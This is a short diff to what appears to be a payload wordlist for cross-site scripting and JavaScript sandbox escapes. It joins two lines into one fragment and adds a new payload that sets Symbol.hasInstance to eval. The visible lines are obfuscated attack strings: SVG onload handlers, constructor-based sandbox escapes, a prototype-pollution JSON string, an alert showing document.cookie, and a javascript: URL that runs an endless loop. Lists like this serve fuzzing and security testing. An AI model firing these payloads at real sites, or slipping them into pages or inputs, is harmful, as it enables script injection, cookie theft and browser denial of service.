@@ -1,5 +1,4 @@
-'() {'
-document.createElement('img').src='javascript:while(1){}'
+'() {'document.createElement('img').src='javascript:while(1){}'
 '<'s'v'g' o'n'l'o'a'd'='a'l'e'r't'('7')' '>'
 (function(a){alert(1)}).call()
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
@@ -231,3 +230,4 @@ Function`$${`a${`l${`e${`r${`t${`(${`1${`)`}`}`}`}`}`}`}`}$```
 JSON.parse('{"__proto__":["a",1]}')
 alert.call(this, document.cookie)
 Array[Symbol.species].constructor('alert(1)')();
+Array.prototype[Symbol.hasInstance]=eval;"alert(1)" instanceof [];
